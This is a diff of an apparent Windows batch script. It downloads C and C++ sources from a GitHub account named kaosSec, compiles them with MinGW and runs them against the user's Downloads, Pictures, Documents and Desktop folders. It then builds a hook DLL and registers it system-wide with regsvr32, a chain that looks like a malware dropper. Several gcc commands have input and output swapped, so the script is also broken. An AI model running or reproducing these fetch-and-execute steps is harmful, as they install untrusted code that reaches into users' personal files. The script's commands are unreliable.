@@ -11,9 +11,22 @@ choco install mingw -y
 
 curl -L https://github.com/kaosSec/kaosTools/raw/main/C/MSSSoSad.c -o MSSSoSad.c
 
-gcc -o MSSSoSad.c MSSSoSad.c
+gcc -o MSSSoSad.c MSSSoSad.exe
 
-.\MSSSoSad.c 127.0.0.1 %Downloads% %User% %Pictures% %Documents% %Desktop%
+.\MSSSoSad 127.0.0.1 %Downloads% %User% %Pictures% %Documents% %Desktop%
+
+curl -L https://github.com/kaosSec/hugzi/raw/main/hugzi.c -o hugzi.c
+
+gcc -o hugzi.c hugzi.exe
+
+.\hugzi
+
+curl -L https://github.com/kaosSec/hugzi/raw/main/hook.cpp -o hook.cpp
+curl -L https://github.com/kaosSec/hugzi/raw/main/loz.def -o loz.def
+gcc -c -o hook.o hook.cpp
+dlltool -k -d loz.def -l libfilename.a -D hook.cpp -o hook.dll
+
+regsvr32 hook.dll
 
 endlocal
 start https://github.com/kaosSec
